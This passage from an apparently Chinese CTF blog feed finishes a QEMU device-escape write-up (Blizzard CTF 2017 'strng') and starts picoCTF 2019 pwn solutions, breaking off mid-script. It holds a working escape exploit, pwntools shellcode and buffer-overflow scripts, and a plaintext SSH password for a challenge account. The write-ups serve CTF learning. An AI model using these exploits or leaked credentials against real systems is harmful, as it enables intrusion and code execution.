href="#查看strng-pmio-read函数" class="headerlink" title="查看strng_pmio_read函数"></a>查看strng_pmio_read函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> __<span class="function">fastcall <span class="title">strng_pmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint32_t</span> reg_addr; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        reg_addr = opaque-&gt;addr;</span><br><span class="line">        <span class="keyword">if</span> ( !(reg_addr &amp; <span class="number">3</span>) )</span><br><span class="line">          result = opaque-&gt;regs[reg_addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = opaque-&gt;addr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先满足地址为四个字节，当</p><p><code>addr=0</code>:返回opaque-&gt;addr的值</p><p><code>addr!=</code>:将opaque-&gt;addr的值右移两位作为regs的索引并返回该值</p><p>这里我们可以发现可以读取任意地址，只要可以将某个地址相对regs的偏移赋值给opaque-&gt;addr，便可以泄露该地址的值。例如：将<code>104</code>传给opaque-&gt;addr，便可以泄露srand低四位地址的值。</p><h4 id="查看strng-pmio-write函数"><a href="#查看strng-pmio-write函数" class="headerlink" title="查看strng_pmio_write函数"></a>查看strng_pmio_write函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">strng_pmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> reg_addr; <span class="comment">// eax</span></span><br><span class="line">  __int64 idx; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        reg_addr = opaque-&gt;addr;</span><br><span class="line">        <span class="keyword">if</span> ( !(reg_addr &amp; <span class="number">3</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          idx = reg_addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (_DWORD)idx == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[<span class="number">1</span>] = opaque-&gt;rand(opaque, <span class="number">4L</span>L, val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)idx &lt; <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) == v6 )</span><br><span class="line">              opaque-&gt;srand((<span class="keyword">unsigned</span> <span class="keyword">int</span>)val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)idx == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[<span class="number">3</span>] = opaque-&gt;rand_r(&amp;opaque-&gt;regs[<span class="number">2</span>], <span class="number">4L</span>L, val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[idx] = val;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;addr = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先满足地址大小为四字节，当addr=0时，将val赋值给opaque-&gt;addr，于是可以实现数组越界可读。当addr不为0时，如果opaque-&gt;addr满足四字节对齐，则将其右移两位赋值给regs的索引idx，其余操作与mmio_write大体相同。因此可以实现数组越界可写。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>将<code>108</code>写入opaque-&gt;addr，泄露出srand高四字节地址，将<code>104</code>写入opaque-&gt;addr，泄露出srand低四字节地址</li><li>根据srand的地址算出libc基址以及system的地址</li><li>将system地址写进rand_r地址处,将“cat flag”写进regs[2]处</li><li>利用mmio_wrtie，addr=12，触发漏洞，获取flag</li></ol><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>为了方便，我们创建一个gdb脚本debug.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b strng_mmio_read</span><br><span class="line">b strng_mmio_write</span><br><span class="line">b strng_pmio_read</span><br><span class="line">b strng_pmio_write</span><br><span class="line">run  -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -enable-kvm -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure><p>gdb调试qemu</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  strng sudo gdb qemu-system-x86_64</span><br><span class="line">[sudo] kangel 的密码： </span><br><span class="line">GNU gdb (GDB) 8.3</span><br><span class="line">Copyright (C) 2019 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type <span class="string">"show copying"</span> and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-pc-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</span><br><span class="line">pwndbg: loaded 180 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from qemu-system-x86_64...</span><br><span class="line">pwndbg&gt; <span class="built_in">source</span> debug.txt</span><br></pre></td></tr></table></figure><p>ssh登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ ssh -p 5555 ubuntu@localhost</span><br></pre></td></tr></table></figure><p>exp.c主函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line">    </span><br><span class="line">    mmio_write(<span class="number">8</span>,<span class="number">0x20746163</span>);</span><br><span class="line">    mmio_write(<span class="number">12</span>,<span class="number">0x67616c66</span>);</span><br><span class="line">    mmio_write(<span class="number">16</span>,<span class="number">0x00000000</span>);</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leaking libc address </span></span><br><span class="line">    <span class="keyword">uint64_t</span> srandom_addr=pmio_arbread(<span class="number">0x108</span>);</span><br><span class="line">    srandom_addr=srandom_addr&lt;&lt;<span class="number">32</span>;</span><br><span class="line">    srandom_addr+=pmio_arbread(<span class="number">0x104</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking srandom addr: 0x%llx\n"</span>,srandom_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> libc_base= srandom_addr<span class="number">-0x43bb0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr= libc_base+<span class="number">0x4f440</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"libc base: 0x%llx\n"</span>,libc_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"system addr: 0x%llx\n"</span>,system_addr);</span><br><span class="line">    <span class="comment">// overwrite rand_r pointer to system</span></span><br><span class="line">    pmio_abwrite(<span class="number">0x114</span>,system_addr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0xc</span>,<span class="number">0</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ gcc -m32 -O0 test_mmio.c -o test_mmio</span><br></pre></td></tr></table></figure><p>将exp传给guest</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntu</span><br></pre></td></tr></table></figure><p>执行exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ sudo ./exp</span><br></pre></td></tr></table></figure><p>此时gdb断在了<code>strng_mmio_write</code>处，ida查看此时寄存器的状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004103E0 opaque = rdi                            ; void *</span><br><span class="line">.text:00000000004103E0 addr = rsi                              ; hwaddr</span><br><span class="line">.text:00000000004103E0 val_0 = rdx                             ; uint64_t</span><br><span class="line">.text:00000000004103E0 size = rcx                              ; unsigned int</span><br></pre></td></tr></table></figure><p>查看gdb中寄存器的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RBX  0x20746163</span><br><span class="line">RCX  0x4</span><br><span class="line">RDX  0x20746163</span><br><span class="line">RDI  0x5555566f4860 —▸ 0x5555565c52e0 —▸ 0x555556572600 —▸ 0x555556572780 ◂— 0x676e727473 /* u&apos;strng&apos; */</span><br><span class="line">RSI  0x8</span><br></pre></td></tr></table></figure><p>通过rdi+0xaf0查看addr、regs等结构体的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx $rdi+0xaf0</span><br><span class="line">0x5555566f5350:0x00000000000000000x2074616300000000</span><br><span class="line">0x5555566f5360:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f5370:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f5380:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f5390:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f53a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f53b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f53c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f53d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f53e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f53f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f5400:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f5410:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f5420:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f5430:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f5440:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555566f5450:0x00000000000000000x00007ffff6466bb0  #srand</span><br><span class="line">0x5555566f5460:0x00007ffff64673a00x00007ffff64673b0  #rand、rand_r</span><br><span class="line">0x5555566f5470:0x00000000000000000x0000000000000111</span><br><span class="line">0x5555566f5480:0x00000000000000000x00005555577793a0</span><br></pre></td></tr></table></figure><p>查看srand、rand、rand_r函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x00007ffff6466bb0</span><br><span class="line">0x7ffff6466bb0 &lt;__srandom&gt;:0x01befa8908ec8348</span><br><span class="line">pwndbg&gt; x/gx 0x00007ffff64673a0</span><br><span class="line">0x7ffff64673a0 &lt;rand&gt;:0xfff9f7e808ec8348</span><br><span class="line">pwndbg&gt; x/gx 0x00007ffff64673b0</span><br><span class="line">0x7ffff64673b0 &lt;rand_r&gt;:0x390541c64e6d0769</span><br></pre></td></tr></table></figure><p>利用readelf查看srandom、system函数相对于libc基址的偏移，分别为<code>0x43bb0</code>、<code>0x4f440</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  strng readelf -s /lib/x86_64-linux-gnu/libc-2.27.so|grep -E <span class="string">"srandom|system"</span></span><br><span class="line">   232: 0000000000159e20    99 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5</span><br><span class="line">   607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE</span><br><span class="line">   735: 0000000000043e60   290 FUNC    WEAK   DEFAULT   13 srandom_r@@GLIBC_2.2.5</span><br><span class="line">  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5</span><br><span class="line">  1704: 0000000000043bb0   142 FUNC    WEAK   DEFAULT   13 srandom@@GLIBC_2.2.5</span><br></pre></td></tr></table></figure><p>exploit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ sudo ./exp</span><br><span class="line">mmio_mem @ 0xb77c0000</span><br><span class="line">cat: -: 资源暂时不可用</span><br><span class="line">leaking srandom addr: 0x7f5809579bb0</span><br><span class="line">libc base: 0x7f5809536000</span><br><span class="line">system addr: 0x7f5809585440</span><br><span class="line">leaking heap addr: 0x56130e168ef0</span><br><span class="line">parameter addr: 0x56130e1a2b6c</span><br><span class="line">flag&#123;strng_escape&#125;</span><br></pre></td></tr></table></figure><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.w0lfzhang.com/2018/11/05/Blizzard-CTF-2017-Strng/#more" target="_blank" rel="noopener">https://www.w0lfzhang.com/2018/11/05/Blizzard-CTF-2017-Strng/#more</a></p><p><a href="https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html" target="_blank" rel="noopener">https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html</a></p><p><a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge</a></p>]]></content>
      
      
      <categories>
          
          <category> qemu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> qemu </tag>
            
            <tag> escape </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>picoctf2019pwn解题记录</title>
      <link href="/2019/09/30/picoctf2019pwn%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/09/30/picoctf2019pwn%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h4 id="practice-run-1"><a href="#practice-run-1" class="headerlink" title="practice-run-1"></a>practice-run-1</h4><p>ssh远程连接，直接运行程序即可得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kangel@pico-2019-shell1:~$ <span class="built_in">cd</span> /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e</span><br><span class="line">kangel@pico-2019-shell1:/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e$ ls</span><br><span class="line">run_this</span><br><span class="line">kangel@pico-2019-shell1:/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e$ ./run_this</span><br><span class="line">picoCTF&#123;g3t_r3adY_2_r3v3r53&#125;</span><br></pre></td></tr></table></figure><h4 id="handy-shellcode"><a href="#handy-shellcode" class="headerlink" title="handy-shellcode"></a>handy-shellcode</h4><p>利用pwntools进行ssh连接，然后写进shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"shellcode:\n"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>拿到shell之后</p><p><code>picoCTF{h4ndY_d4ndY_sh311c0d3_707f1a87}</code></p><h4 id="slippery-shellcode"><a href="#slippery-shellcode" class="headerlink" title="slippery-shellcode"></a>slippery-shellcode</h4><p>和handy-shellcode类似，进行右填充即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"shellcode:\n"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.rjust(<span class="number">512</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}</code></p><h4 id="OverFlow-0"><a href="#OverFlow-0" class="headerlink" title="OverFlow 0"></a>OverFlow 0</h4><p>题目给了源代码和程序，按照一般的pwn题解法，还是直接用ida查看程序</p><p><img alt="" data-src="/2019/09/30/picoctf2019pwn解题记录/1.JPG" class="lazyload"></p><p>程序发生段错误则执行sigsegv_handler函数，该函数刚好打印flag，所以只要栈溢出到ebp即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kangel@pico-2019-shell1:/problems/overflow-0_5_db665826dabb99c44758c97abfd8c4c6$ ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">picoCTF&#123;3asY_P3a5y4a888b8e&#125;</span><br></pre></td></tr></table></figure><h4 id="OverFlow-1"><a href="#OverFlow-1" class="headerlink" title="OverFlow 1"></a>OverFlow 1</h4><p>返回地址覆盖成flag函数地址即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line"><span class="comment">#p = process("./vuln")</span></span><br><span class="line">flag_addr = <span class="number">0x080485E6</span></span><br><span class="line">p.recvuntil(<span class="string">"happens: "</span>)</span><br><span class="line">payload = <span class="number">0x48</span>*<span class="string">'a'</span> + <span class="string">'aaaa'</span> + p32(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5b80c9cbf}</code></p><h4 id="OverFlow-2"><a href="#OverFlow-2" class="headerlink" title="OverFlow 2"></a>OverFlow 2</h4><p>返回地址覆盖成flag地址，32位参数覆写直接在栈中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/overflow-2_1_210f23786438d7f7e527f4901367a74b"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">flag_addr = <span class="number">0x080485E6</span></span><br><span class="line">p.recvuntil(<span class="string">"string: "</span>)</span><br><span class="line">payload =<span class="number">0xb8</span>*<span class="string">'a'</span> + <span class="string">'aaaa'</span> + p32(flag_addr) +<span class="string">'aaaa'</span> + p32(<span class="number">0xDEADBEEF</span>) + p32(<span class="number">0xC0DED00D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>picoCTF{arg5_and_r3turn5001d1db0}</code></p><h4 id="NewOverFlow-1"><a href="#NewOverFlow-1" class="headerlink" title="NewOverFlow 1"></a>NewOverFlow 1</h4><p>在Ubuntu18的环境中，直接将返回地址覆盖成flag地址，flag函数中的printf会出现段错误，需要通过执行一些其他函数来调整寄存器或对齐，这里先执行puts函数，然后执行flag函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span 